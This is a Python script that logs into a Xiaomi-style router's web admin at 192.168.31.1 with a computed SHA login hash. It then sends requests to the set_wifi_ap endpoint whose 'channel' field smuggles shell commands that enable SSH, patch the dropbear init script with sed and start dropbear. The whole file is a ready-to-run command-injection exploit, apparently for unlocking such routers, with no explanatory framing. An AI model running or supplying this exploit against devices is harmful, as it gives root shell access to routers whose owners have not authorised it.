import requests
from Crypto.Hash import SHA
import random
import time
import json
import re

def getToken(password):

    homeRequest = requests.get('http://192.168.31.1/cgi-bin/luci/web/home')
    key = re.findall(r'key: \'(.*)\',', homeRequest.text)[0]
    mac = re.findall(r'deviceId = \'(.*)\';', homeRequest.text)[0]

    aimurl = "http://192.168.31.1/cgi-bin/luci/api/xqsystem/login"

    nonce = "0_" + mac + "_" + str(int(time.time())) + "_" + str(random.randint(1000, 10000))

    pwd = SHA.new()
    input = bytes(password + key, encoding = "utf8")  
    pwd.update(input)
    hexpwd1 = pwd.hexdigest()

    pwd2 = SHA.new()
    pwd2.update(bytes(nonce + hexpwd1, encoding = "utf8")  )
    hexpwd2 = pwd2.hexdigest()

    data = {
        "logtype": 2,
        "nonce": nonce,
        "password": hexpwd2,
        "username": "admin"
    }

    response = requests.post(url=aimurl, data=data, timeout=5)
    resjson = json.loads(response.content)

    if resjson['code'] == 0:
        return resjson['token']
    else:
        return False

password = "123456789"
stok = getToken(password)
if stok==False:
	print("get stok fail.....")
	exit()
	
text1 = "http://192.168.31.1/cgi-bin/luci/;stok={}/api/xqnetwork/set_wifi_ap?ssid=tianbao&encryption=NONE&enctype=NONE&channel=1%3Bnvram%20set%20ssh%5Fen%3D1%3B%20nvram%20commit".format(stok)
text2 = "http://192.168.31.1/cgi-bin/luci/;stok={}/api/xqnetwork/set_wifi_ap?ssid=tianbao&encryption=NONE&enctype=NONE&channel=1%3Bsed%20%2Di%20%22%3Ax%3AN%3As%2Fif%20%5C%5B%2E%2A%5C%3B%20then%5Cn%2E%2Areturn%200%5Cn%2E%2Afi%2F%23tb%2F%3Bb%20x%22%20%2Fetc%2Finit.d%2Fdropbear".format(stok)
text3 = "http://192.168.31.1/cgi-bin/luci/;stok={}/api/xqnetwork/set_wifi_ap?ssid=tianbao&encryption=NONE&enctype=NONE&channel=1%3B%2Fetc%2Finit.d%2Fdropbear%20start".format(stok)
text4 = "http://192.168.31.1/cgi-bin/luci/;stok={}/api/xqsystem/set_name_password?oldPwd={}&newPwd={}".format(stok, password, password)

print("-------------------------")
print(text1)
print("-------------------------")
print(text2)
print("-------------------------")
print(text3)
print("-------------------------")
print(text4)
print("-------------------------")

print("------------requests-------------")
result = requests.get(text1)
print(result.text)
print("------------requests-------------")
result = requests.get(text2)
print(result.text)
print("------------requests-------------")
result = requests.get(text3)
print(result.text)
print("------------requests-------------")
result = requests.get(text4)
print(result.text)
print("------------done-------------")

